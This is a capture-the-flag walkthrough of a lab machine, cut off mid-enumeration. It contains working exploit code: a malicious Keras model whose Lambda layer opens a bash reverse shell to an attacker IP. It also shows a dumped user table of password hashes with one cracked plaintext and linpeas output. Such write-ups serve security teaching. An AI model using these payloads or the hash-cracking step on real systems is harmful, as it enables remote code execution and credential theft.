---
title: "Artificial"
date: 2025-09-27
slug: "artificial"
tags: ["Easy", "HTB", "Linux"]
difficulty: "Unrated"
platform: "HTB"
os: "Unknown-OS"
cover: "/images/artificial/Pasted image 20250909084737.png"
summary: "Walkthrough of the Artificial HTB machine covering recon, exploitation, and privilege escalation."
---
## Recon

```shell
nmap 10.129.248.169
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-09 08:11 EEST
Nmap scan report for 10.129.248.169
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.21 seconds

```

```shell
nmap -p- 10.129.248.169
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-09 08:12 EEST
Stats: 0:00:14 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 6.84% done; ETC: 08:15 (0:03:11 remaining)
Nmap scan report for 10.129.248.169
Host is up (0.11s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 471.75 seconds

```


## Web

Added artificial.htb to /etc/hosts

Created an account test@test.com:testtest

![artificial-1](/images/artificial/Pasted image 20250909084737.png)


Looking at the Docker File:

```
FROM python:3.8-slim

WORKDIR /code

RUN apt-get update && \
    apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*

RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

ENTRYPOINT ["/bin/bash"]	
```

The docker file builds a minimal Python 3.8 container with manually installed TensorFlow v2.13.1 (CPU version) using a wheel file, and drops into a bash shell when the container runs.  
requirements.txt:

```txt
tensorflow-cpu==2.13.1
```

So the version used in the application is 2.13.1 exactly, which has a critical vulnerability: CVE-2024-3660

## Initial Foothold

I will try and build the docker first and check what is the environment of the application:

```shell
docker build -t tf-cpu:2.13.1 .
[+] Building 66.2s (8/8) FINISHED                                                                                                                                                                                            docker:default
 => [internal] load build definition from Dockerfile                                                                                                                                                                                   0.1s
 => => transferring dockerfile: 496B                                                                                                                                                                                                   0.0s
 => [internal] load metadata for docker.io/library/python:3.8-slim                                                                                                                                                                     2.9s
 => [internal] load .dockerignore                                                                                                                                                                                                      0.0s
 => => transferring context: 2B                                                                                                                                                                                                        0.0s
 => [1/4] FROM docker.io/library/python:3.8-slim@sha256:1d52838af602b4b5a831beb13a0e4d073280665ea7be7f69ce2382f29c5a613f                                                                                                               5.6s
 => => resolve docker.io/library/python:3.8-slim@sha256:1d52838af602b4b5a831beb13a0e4d073280665ea7be7f69ce2382f29c5a613f                                                                                                               0.0s
 => => sha256:314bc2fb0714b7807bf5699c98f0c73817e579799f2d91567ab7e9510f5601a5 1.75kB / 1.75kB                                                                                                                                         0.0s
 => => sha256:b5f62925bd0f63f48cc8acd5e87d0c3a07e2f229cd2fb0a9586e68ed17f45ee3 5.25kB / 5.25kB                                                                                                                                         0.0s
 => => sha256:302e3ee498053a7b5332ac79e8efebec16e900289fc1ecd1c754ce8fa047fcab 29.13MB / 29.13MB                                                                                                                                       4.2s
 => => sha256:030d7bdc20a63e3d22192b292d006a69fa3333949f536d62865d1bd0506685cc 3.51MB / 3.51MB                                                                                                                                         1.8s
 => => sha256:a3f1dfe736c5f959143f23d75ab522a60be2da902efac236f4fb2a153cc14a5d 14.53MB / 14.53MB                                                                                                                                       3.0s
 => => sha256:1d52838af602b4b5a831beb13a0e4d073280665ea7be7f69ce2382f29c5a613f 10.41kB / 10.41kB                                                                                                                                       0.0s
 => => sha256:3971691a363796c39467aae4cdce6ef773273fe6bfc67154d01e1b589befb912 248B / 248B                                                                                                                                             2.2s
 => => extracting sha256:302e3ee498053a7b5332ac79e8efebec16e900289fc1ecd1c754ce8fa047fcab                                                                                                                                              0.5s
 => => extracting sha256:030d7bdc20a63e3d22192b292d006a69fa3333949f536d62865d1bd0506685cc                                                                                                                                              0.1s
 => => extracting sha256:a3f1dfe736c5f959143f23d75ab522a60be2da902efac236f4fb2a153cc14a5d                                                                                                                                              0.3s
 => => extracting sha256:3971691a363796c39467aae4cdce6ef773273fe6bfc67154d01e1b589befb912                                                                                                                                              0.0s
 => [2/4] WORKDIR /code                                                                                                                                                                                                                0.8s
 => [3/4] RUN apt-get update &&     apt-get install -y curl &&     curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_  23.2s
 => [4/4] RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl                                                                                                                            30.8s 
 => exporting to image                                                                                                                                                                                                                 2.6s 
 => => exporting layers                                                                                                                                                                                                                2.6s 
 => => writing image sha256:383d50b619080e4db19e5e73e993873cf94c7e0bca181ce107daaf0bc211bab2                                                                                                                                           0.0s 
 => => naming to docker.io/library/tf-cpu:2.13.1     
```

For the purpose of testing I have created a directory `tf-docker` and built the docker image there

```shell
docker run -it tf-cpu:2.13.1
root@adff15ba83e9:/code# python
Python 3.8.20 (default, Sep 27 2024, 06:05:23) 
[GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import tensorflow as tf
2025-09-09 05:58:46.938964: I tensorflow/core/util/port.cc:110] oneDNN custom operations are on. You may see slightly different numerical results due to floating-point round-off errors from different computation orders. To turn them off, set the environment variable `TF_ENABLE_ONEDNN_OPTS=0`.
2025-09-09 05:58:46.961319: I tensorflow/core/platform/cpu_feature_guard.cc:182] This TensorFlow binary is optimized to use available CPU instructions in performance-critical operations.
To enable the following instructions: AVX2 AVX_VNNI FMA, in other operations, rebuild TensorFlow with the appropriate compiler flags.
>>> print(tf.__version__)
2.13.1
>>> exit
Use exit() or Ctrl-D (i.e. EOF) to exit
>>> exit()
root@adff15ba83e9:/code# python --version
Python 3.8.20
root@adff15ba83e9:/code# 

```

SO this is the environment which runs models uploaded on the server. I will try to run a POC locally and check if it works and then upload to the application and obtain a reverse shell

I will use scripts from here: https://github.com/Splinter0/tensorflow-rce

exploit.py:

```shell
cat exploit.py   
import tensorflow as tf

def exploit(x):
    import os
    os.system("bash -c 'bash -i >& /dev/tcp/10.10.16.46/6666 0>&1' ")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")

```

model.py:

```shell
cat model.py    
from tensorflow import keras

m = keras.models.load_model("exploit.h5")
```

To transfer the files

Python server
```shell
python -m http.server 8999
Serving HTTP on 0.0.0.0 port 8999 (http://0.0.0.0:8999/) ...
172.17.0.2 - - [09/Sep/2025 09:11:31] "GET /model.py HTTP/1.1" 200 -
172.17.0.2 - - [09/Sep/2025 09:11:47] "GET /exploit.py HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.

```


Download the files on machine:

```shell
curl -o model.py http://10.10.16.46:8999/model.py
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    72  100    72    0     0   8187      0 --:--:-- --:--:-- --:--:--  9000
root@adff15ba83e9:/code# ls
model.py  tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl
root@adff15ba83e9:/code# curl -o exploit.py http://10.10.16.46:8999/exploit.py
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   329  100   329    0     0   313k      0 --:--:-- --:--:-- --:--:--  321k
root@adff15ba83e9:/code# ls
exploit.py  model.py  tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl
root@adff15ba83e9:/code# 

```


Now run the POC:

```shell
python exploit.py
2025-09-09 06:14:06.484243: I tensorflow/core/util/port.cc:110] oneDNN custom operations are on. You may see slightly different numerical results due to floating-point round-off errors from different computation orders. To turn them off, set the environment variable `TF_ENABLE_ONEDNN_OPTS=0`.
2025-09-09 06:14:06.504449: I tensorflow/core/platform/cpu_feature_guard.cc:182] This TensorFlow binary is optimized to use available CPU instructions in performance-critical operations.
To enable the following instructions: AVX2 AVX_VNNI FMA, in other operations, rebuild TensorFlow with the appropriate compiler flags.
sh: 1: nc: not found
/usr/local/lib/python3.8/site-packages/keras/src/engine/training.py:3000: UserWarning: You are saving your model as an HDF5 file via `model.save()`. This file format is considered legacy. We recommend using instead the native Keras format, e.g. `model.save('my_model.keras')`.
  saving_api.save_model(
root@adff15ba83e9:/code# python model.py
2025-09-09 06:14:16.726622: I tensorflow/core/util/port.cc:110] oneDNN custom operations are on. You may see slightly different numerical results due to floating-point round-off errors from different computation orders. To turn them off, set the environment variable `TF_ENABLE_ONEDNN_OPTS=0`.
2025-09-09 06:14:16.754161: I tensorflow/core/platform/cpu_feature_guard.cc:182] This TensorFlow binary is optimized to use available CPU instructions in performance-critical operations.
To enable the following instructions: AVX2 AVX_VNNI FMA, in other operations, rebuild TensorFlow with the appropriate compiler flags.
sh: 1: nc: not found

```

I will try change the exploit.py to this: (took from inject.py in the github and modified the command if in case there is no nc installed in the docker environment)

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("bash -c 'bash -i >& /dev/tcp/10.10.16.46/6666 0>&1' ")
    return x

lambdaLayer = tf.keras.layers.Lambda(exploit, name="output")

original = tf.keras.applications.vgg16.VGG16()
original.summary()

inp = original.input
original.layers.pop()

infected = tf.keras.models.Model(inp, lambdaLayer(original.layers[-1].output))

for layer in infected.layers:
    layer.trainable = False
    
infected.summary()
infected.save("exploit.h5")

```

With this new exploit script, all I have to do is run the exploit while opening the listener. 

Now we have to upload the compiled exploit in some way to the server

```shell
docker cp adff15ba83e9:/code/exploit.h5 exploit.h5  
Successfully copied 554MB to /home/husmal/Downloads/tf-docker/exploit.h5
```

verify:

```shell
ls  
Dockerfile  exploit.h5  exploit.py  model.py

```

Upload exploit.5 file to the server and keep nc listener open to check if we have a connection back:

I keep getting this error when uploading the file and I don't know why

![artificial-2](/images/artificial/Pasted image 20250909095837.png)

this error is even on firefox and brave browser so there is something going on, I will post the issue in the discord, in the mean time I will try from pwnbox. I got the same error from pwnbox again. I will use the old exploit script that is triggered by running model.py and I will test it locally and then try uploading it. The old exploit.py script is 554 mb.

The new h5 file  is barely in kb:

```shell
sudo docker cp b1ccf7fcab72:/code/exploit.h5 exploit.h5
Successfully copied 11.8kB to /home/mlaynedere/Downloads/exploit.h5
```

![artificial-3](/images/artificial/Pasted image 20250910103224.png)

finally!

```shell
nc -nlvp 6666
listening on [any] 6666 ...
connect to [10.10.14.32] from (UNKNOWN) [10.129.232.51] 51830
bash: cannot set terminal process group (946): Inappropriate ioctl for device
bash: no job control in this shell
app@artificial:~/app$ ls
ls
app.py
instance
models
__pycache__
static
templates
app@artificial:~/app$ whoami
whoami
app
app@artificial:~/app$ 

```

## Obtaining User flag

```shell
app@artificial:~/app$ ls -R
ls -R
.:
app.py  instance  models  __pycache__  static  templates

./instance:
users.db

./models:
0a37138c-7dc4-4767-bf42-651eb3fc6e84.h5

./__pycache__:
app.cpython-38.pyc

./static:
css  Dockerfile  js  requirements.txt

./static/css:
styles.css

./static/js:
scripts.js

./templates:
dashboard.html  index.html  login.html  register.html  run_model.html
app@artificial:~/app$ cd instance
cd instance
app@artificial:~/app/instance$ sqlite3 users.db
sqlite3 users.db
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
.tables
model  user 
sqlite> SELECT * FROM user;
SELECT * FROM user;
1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
6|test|test@test.com|05a671c66aefea124cc08b76ea6d30bb
sqlite> 

```

gael seems interesting:

```shell
ls /home
ls /home
app  gael

```

from hashes.com we get: `c99175974b6e192936d97224638a34f8:mattp005numbertwo`


simply ssh into gael user and obtain the flag in her home directory:

```shell
gael@artificial:~$ ls
user.txt
gael@artificial:~$ pwd
/home/gael
gael@artificial:~$ cat user.txt
b11c29f48f652a60578765c88407d8d5
gael@artificial:~$
```


## Obtaining Root Flag

```shell
sudo -l
[sudo] password for gael: 
Sorry, try again.
[sudo] password for gael: 
Sorry, user gael may not run sudo on artificial.

```

Looks like I will run linpeas

I will cherry pick interesting info from linpeas.sh:

```shell
Vulnerable to CVE-2021-3560

╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                                                                                                                                               
apparmor module is loaded.
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found                                                                                                                                                                                    
═╣ PaX bins present? .............. PaX Not Found                                                                                                                                                                                           
═╣ Execshield enabled? ............ Execshield Not Found                                                                                                                                                                                    
═╣ SELinux enabled? ............... sestatus Not Found                                                                                                                                                                                      
═╣ Seccomp enabled? ............... disabled                                                                                                                                                                                                
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (vmware)                                                                                                                                                                                            

╔══════════╣ Kernel Modules Information
══╣ Kernel modules with weak perms?                                                                                                                                                                                                       
══╣ Kernel modules loadable? 
Modules can be loaded        

```


```shell
Active services:
accounts-daemon.service                                                                   loaded active running Accounts Service                                                                                                            
app.service                                                                               loaded active running App
apparmor.service                                                                          loaded active exited  Load AppArmor profiles
apport.service                                                                            loaded active exited  LSB: automatic crash report generation
atd.service                                                                               loaded active running Deferred execution scheduler
  Potential issue in service file: /lib/systemd/system/atd.service
  └─ RELATIVE_PATH: Could be executing some relative path\n
auditd.service                                                                            loaded active running Security Auditing Service
backrest.service                                                                          loaded active running Backrest Service
  Potential issue in service: backrest.service
  └─ RUNS_AS_ROOT: Service runs as root\n
blk-availability.service                                                                  loaded active exited  Availability of block devices
console-setup.service                                                                     loaded active exited  Set console font and keymap
cron.service                                                                              loaded active running Regular background program processing daemon
dbus.service                                                                              loaded active running D-Bus System Message Bus
finalrd.service                                                                           loaded active exited  Create final runtime dir for shutdown pivot root
getty@tty1.service                                                                        loaded active running Getty on tty1
ifup@eth0.service                                                                         loaded active exited  ifup for eth0
  Potential issue in service file: /lib/systemd/system/ifup@.service
  └─ RELATIVE_PATH: Could be executing some relative path\n
ifupdown-pre.service                                                                      loaded active exited  Helper to synchronize boot up for ifupdown
  Potential issue in service file: /lib/systemd/system/ifupdown-pre.service
  └─ RELATIVE_PATH: Could be executing some relative path\n
irqbalance.service                                                                        loaded active running irqbalance daemon
keyboard-setup.service                                                                    loaded active exited  Set the console keyboard layout
kmod-static-nodes.service                                                                 loaded active exited  Create list of static device nodes for the current kernel
lvm2-monitor.service                                                                      loaded active exited  Monitoring of LVM2 mirrors, snapshots etc. using dmeventd or progress polling
lvm2-pvscan@8:3.service                                                                   loaded active exited  LVM event activation on device 8:3
ModemManager.service                                                                      loaded active running Modem Manager
  Potential issue in service: ModemManager.service
  └─ RUNS_AS_ROOT: Service runs as root\n
multipathd.service                                                                        loaded active running Device-Mapper Multipath Device Controller
networkd-dispatcher.service                                                               loaded active running Dispatcher daemon for systemd-networkd
networking.service                                                                        loaded active exited  Raise network interfaces
nginx.service                                                                             loaded active running A high performance web server and a reverse proxy server
open-vm-tools.service                                                                     loaded active running Service for virtual machines hosted on VMware
polkit.service                                                                            loaded active running Authorization Manager
rsyslog.service                                                                           loaded active running System Logging Service
setvtrgb.service                                                                          loaded active exited  Set console scheme
ssh.service                                                                               loaded active running OpenBSD Secure Shell server
systemd-fsck@dev-disk-by\x2duuid-9ec7c90e\x2d6185\x2d4db0\x2da58f\x2da8caab26f405.service loaded active exited  File System Check on /dev/disk/by-uuid/9ec7c90e-6185-4db0-a58f-a8caab26f405
systemd-journal-flush.service                                                             loaded active exited  Flush Journal to Persistent Storage
  Potential issue in service file: /lib/systemd/system/systemd-journal-flush.service
  └─ RELATIVE_PATH: Could be executing some relative path\n
systemd-journald.service                                                                  loaded active running Journal Service
systemd-logind.service                                                                    loaded active running Login Service
systemd-modules-load.service                                                              loaded active exited  Load Kernel Modules
systemd-networkd.service                                                                  loaded active running Network Service
systemd-random-seed.service                                                               loaded active exited  Load/Save Random Seed
systemd-remount-fs.service                                                                loaded active exited  Remount Root and Kernel File Systems
  Potential issue in service: systemd-remount-fs.service
  └─ UNSAFE_CMD: Uses potentially dangerous commands\n
systemd-resolved.service                                                                  loaded active running Network Name Resolution
systemd-sysctl.service                                                                    loaded active exited  Apply Kernel Variables
systemd-sysusers.service                                                                  loaded active exited  Create System Users
  Potential issue in service file: /lib/systemd/system/systemd-sysusers.service
  └─ RELATIVE_PATH: Could be executing some relative path\n
  Potential issue in service: systemd-sysusers.service
  └─ UNSAFE_CMD: Uses potentially dangerous commands\n
systemd-timesyncd.service                                                                 loaded active running Network Time Synchronization
systemd-tmpfiles-setup-dev.service                                                        loaded active exited  Create Static Device Nodes in /dev
systemd-tmpfiles-setup.service                                                            loaded active exited  Create Volatile Files and Directories
systemd-udev-settle.service                                                               loaded active exited  udev Wait for Complete Device Initialization
  Potential issue in service file: /lib/systemd/system/systemd-udev-settle.service
  └─ RELATIVE_PATH: Could be executing some relative path\n
systemd-udev-trigger.service                                                              loaded active exited  udev Coldplug all Devices
  Potential issue in service file: /lib/systemd/system/systemd-udev-trigger.service
  └─ RELATIVE_PATH: Could be executing some relative path\n
  Potential issue in service: systemd-udev-trigger.service
  └─ UNSAFE_CMD: Uses potentially dangerous commands\n
systemd-udevd.service                                                                     loaded active running udev Kernel Device Manager
  Potential issue in service file: /lib/systemd/system/systemd-udevd.service
  └─ RELATIVE_PATH: Could be executing some relative path\n
systemd-update-utmp.service                                                               loaded active exited  Update UTMP about System Boot/Shutdown
systemd-user-sessions.service                                                             loaded active exited  Permit User Sessions
udisks2.service                                                                           loaded active running Disk Manager
user-runtime-dir@1000.service                                                             loaded active exited  User Runtime Directory /run/user/1000
user@1000.service                                                                         loaded active running User Manager for UID 1000
vgauth.service                                                                            loaded active running Authentication service for virtual machines hosted on VMware
LOAD   = Reflects whether the unit definition was properly loaded.
ACTIVE = The high-level unit activation state, i.e. generalization of SUB.
SUB    = The low-level unit activation state, values depend on unit type.
53 loaded units listed.

```

```shell
Active Ports (netstat)                                                                                                                                                                                                                  
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -                                                                                                                                                           
tcp        0      0 127.0.0.1:9898          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -   
```

```shell
PHP exec extensions
drwxr-xr-x 2 root root 4096 Jun  2 07:38 /etc/nginx/sites-enabled                                                                                                                                                                           
drwxr-xr-x 2 root root 4096 Jun  2 07:38 /etc/nginx/sites-enabled
lrwxrwxrwx 1 root root 34 Jun  2 07:38 /etc/nginx/sites-enabled/default -> /etc/nginx/sites-available/default
server {
    listen 80 default_server;
    listen [::]:80 default_server;
    if ($host != artificial.htb) {
        rewrite ^ http://artificial.htb/;
    }
    server_name artificial.htb;
        access_log /var/log/nginx/application.access.log;
        error_log /var/log/nginx/appliation.error.log;
        location / {
                include proxy_params;
                proxy_pass http://127.0.0.1:5000;
        }
}




-rw-r--r-- 1 root root 1490 Mar 20  2024 /etc/nginx/nginx.conf
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;
events {
        worker_connections 768;
}
http {
        sendfile on;
        tcp_nopush on;
        tcp_nodelay on;
        keepalive_timeout 65;
        types_hash_max_size 2048;
        include /etc/nginx/mime.types;
        default_type application/octet-stream;
        ssl_prefer_server_ciphers on;
        access_log /var/log/nginx/access.log;
        error_log /var/log/nginx/error.log;
        gzip on;
        include /etc/nginx/conf.d/*.conf;
        include /etc/nginx/sites-enabled/*;
}

```

I sense something phishy is running on port 9898

```shell
Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root gael 33 Sep 10 07:01 /home/gael/user.txt                                                                                                                                                                                  
-rw-r----- 1 root sysadm 52357120 Mar  4  2025 /var/backups/backrest_backup.tar.gz

```

I will try this POC: https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation

```shell
 ./poc.sh -u=husmal -p=husmal 

[!] Username set as : husmal
[!] No Custom Timing specified.
[!] Timing will be detected Automatically
[!] Force flag not set.
[!] Vulnerability checking is ENABLED!
[!] Starting Vulnerability Checks...
[!] Checking distribution...
[!] Detected Linux distribution as ubuntu
[!] Checking if Accountsservice and Gnome-Control-Center is installed
[x] ERROR: Accounts service and Gnome-Control-Center NOT found!!
[!]  Aborting Execution!
gael@artificial:/dev/shm$ uname -a
Linux artificial 5.4.0-216-generic #236-Ubuntu SMP Fri Apr 11 19:53:21 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
gael@artificial:/dev/shm$ cat /etc/*release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.6 LTS"
NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.6 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal

```

as per the blog post this machine should be vulnerable to the CVE, however `accountsservice gnome-control-center` are not installed

```shell
gnome-control-center --version

Command 'gnome-control-center' not found, but can be installed with:

apt install gnome-control-center
Please ask your administrator.


```

However:

```shell
systemctl status accounts-daemon.service
● accounts-daemon.service - Accounts Service
     Loaded: loaded (/lib/systemd/system/accounts-daemon.service; enabled; vendor preset: enabled)
     Active: active (running) since Wed 2025-09-10 07:00:40 UTC; 11h ago
   Main PID: 755
      Tasks: 3 (limit: 4550)
     Memory: 7.4M
     CGroup: /system.slice/accounts-daemon.service
             └─755 /usr/lib/accountsservice/accounts-daemon

Warning: some journal files were not opened due to insufficient permissions.

```

So looks like we cannot perform the POC although the system is vulnerable

On port 5000, the page seems mirrored:

```shell
curl http://localhost:5000
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Artificial - AI Solutions</title>
    <link rel="stylesheet" href="/static/css/styles.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            line-height: 1.6;
        }
        .code-example-section {
            margin: 40px 0;
            padding: 20px;
            border-radius: 8px;
            background: linear-gradient(to right, #f9f9f9, #e6e6e6);
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }
        .code-example-section h2 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #333;
        }
        pre {
            background-color: #282c34;
            color: #abb2bf;
            border-radius: 8px;
            padding: 20px;
            overflow: auto;
            font-size: 16px;
            line-height: 1.5;
            margin: 0;
        }
        code {
            color: #e06c75;
        }
        .keyword {
            color: #c678dd;
        }
        .comment {
            color: #7f8c8d;
        }
        .string {
            color: #98c379;
        }
        .number {
            color: #d19a66;
        }
    </style>
</head>
<body>

    <!-- Header -->
    <header>
        <h1>Artificial</h1>
        <p>Empowering AI for the Future</p>
        <nav>
            <ul>
                <li><a href="#about">Why Artificial</a></li>
                <li><a href="#reviews">Reviews</a></li>
                <li><a href="/login">Login</a></li>
                <li><a href="/register">Register</a></li>
            </ul>
        </nav>
    </header>

    <!-- Hero Section -->
    <section class="hero-section">
        <h2>Revolutionize Your AI Experience</h2>
        <p>Build, test, and deploy AI models effortlessly with Artificial.</p>
        <a href="/register" class="cta-btn">Get Started</a>
    </section>

    <!-- Why Artificial Section -->
    <section id="about" class="about-section">
        <h2>Why Use Artificial?</h2>
        <p>Artificial offers state-of-the-art AI model building, testing, and deployment with a user-friendly interface. Whether you're a researcher, developer, or AI enthusiast, Artificial provides the tools and platform to innovate and experiment with cutting-edge AI technologies.</p>
        <ul>
            <li>Effortless AI model creation</li>
            <li>Real-time testing and validation</li>
            <li>Seamless deployment to production</li>
        </ul>
        <h3>Predict Future Sales with AI</h3>
        <p>Artificial helps you forecast future sales using advanced AI models. By analyzing historical sales data, our platform predicts which months will see the highest sales. With intuitive tools and seamless interfaces, you can easily visualize these predictions and optimize your sales strategies.</p>
    </section>

    <!-- Code Example Section -->
    <section id="code-example" class="code-example-section">
        <h2>Example Code:</h2>
        <pre><code>
<span class="keyword">import</span> numpy <span class="keyword">as</span> np
<span class="keyword">import</span> pandas <span class="keyword">as</span> pd
<span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf
<span class="keyword">from</span> tensorflow <span class="keyword">import</span> keras
<span class="keyword">from</span> tensorflow.keras <span class="keyword">import</span> layers

np.random.seed(42)

<span class="comment"># Create hourly data for a week</span>
hours = np.arange(0, 24 * 7)
profits = np.random.rand(len(hours)) * 100

<span class="comment"># Create a DataFrame</span>
data = pd.DataFrame({
    <span class="string">'hour'</span>: hours,
    <span class="string">'profit'</span>: profits
})

X = data['hour'].values.reshape(-1, 1)
y = data['profit'].values

<span class="comment"># Build the model</span>
model = keras.Sequential([
    layers.Dense(64, activation='relu', input_shape=(1,)),
    layers.Dense(64, activation='relu'),
    layers.Dense(1)
])

<span class="comment"># Compile the model</span>
model.compile(optimizer='adam', loss='mean_squared_error')

<span class="comment"># Train the model</span>
model.fit(X, y, epochs=100, verbose=1)

<span class="comment"># Save the model</span>
model.save(<span class="string">'profits_model.h5'</span>)

        </code></pre>
    </section>

    <!-- Reviews Section -->
    <section id="reviews" class="reviews-section">
        <h2>What Our Users Say</h2>

        <div class="review">
            <h3>John Doe</h3>
            <p>"Artificial is simply amazing! It makes AI model testing so intuitive."</p>
        </div>

        <div class="review">
            <h3>Jane Smith</h3>
            <p>"I can now build and deploy AI models faster than ever. Highly recommend Artificial!"</p>
        </div>

        <div class="review">
            <h3>Michael Lee</h3>
            <p>"Artificial has completely transformed how we experiment with AI in our lab. Great platform!"</p>
        </div>
    </section>

    <br><br><br><br><br>
    <!-- Footer -->
    <footer class="footer">
        <p>&copy; 2024 Artificial. All Rights Reserved.</p>
    </footer>

    <script src="/static/js/scripts.js"></script>
</body>
</html>

```

Next is to check this:

/var/backups/backrest_backup.tar.gz

Extract:

```shell
file /var/backups/backrest_backup.tar.gz
/var/backups/backrest_backup.tar.gz: POSIX tar archive (GNU)
tar -xf /var/backups/backrest_backup.tar.gz
gael@artificial:~$ ls
backrest  user.txt
gael@artificial:~$ cd backrest/
gael@artificial:~/backrest$ ls -la
total 51092
drwxr-xr-x 5 gael gael     4096 Mar  4  2025 .
drwxr-x--- 6 gael gael     4096 Sep 10 18:39 ..
-rwxr-xr-x 1 gael gael 25690264 Feb 16  2025 backrest
drwxr-xr-x 3 gael gael     4096 Mar  3  2025 .config
-rwxr-xr-x 1 gael gael     3025 Mar  3  2025 install.sh
-rw------- 1 gael gael       64 Mar  3  2025 jwt-secret
-rw-r--r-- 1 gael gael    57344 Mar  4  2025 oplog.sqlite
-rw------- 1 gael gael        0 Mar  3  2025 oplog.sqlite.lock
-rw-r--r-- 1 gael gael    32768 Mar  4  2025 oplog.sqlite-shm
-rw-r--r-- 1 gael gael        0 Mar  4  2025 oplog.sqlite-wal
drwxr-xr-x 2 gael gael     4096 Mar  3  2025 processlogs
-rwxr-xr-x 1 gael gael 26501272 Mar  3  2025 restic
drwxr-xr-x 3 gael gael     4096 Mar  4  2025 tasklogs

```

the backup looks corrupted:

```shell
 ls -la
total 51092
drwxr-xr-x 5 gael gael     4096 Mar  4  2025 .
drwxr-x--- 6 gael gael     4096 Sep 10 18:39 ..
-rwxr-xr-x 1 gael gael 25690264 Feb 16  2025 backrest
drwxr-xr-x 3 gael gael     4096 Mar  3  2025 .config
-rwxr-xr-x 1 gael gael     3025 Mar  3  2025 install.sh
-rw------- 1 gael gael       64 Mar  3  2025 jwt-secret
-rw-r--r-- 1 gael gael    57344 Mar  4  2025 oplog.sqlite
-rw------- 1 gael gael        0 Mar  3  2025 oplog.sqlite.lock
-rw-r--r-- 1 gael gael    32768 Mar  4  2025 oplog.sqlite-shm
-rw-r--r-- 1 gael gael        0 Mar  4  2025 oplog.sqlite-wal
drwxr-xr-x 2 gael gael     4096 Mar  3  2025 processlogs
-rwxr-xr-x 1 gael gael 26501272 Mar  3  2025 restic
drwxr-xr-x 3 gael gael     4096 Mar  4  2025 tasklogs
gael@artificial:~/backrest$ ls -R .config
ls: cannot access '.config': No such file or directory
gael@artificial:~/backrest$ ls .config
ls: cannot access '.config': No such file or directory
gael@artificial:~/backrest$ cd .config
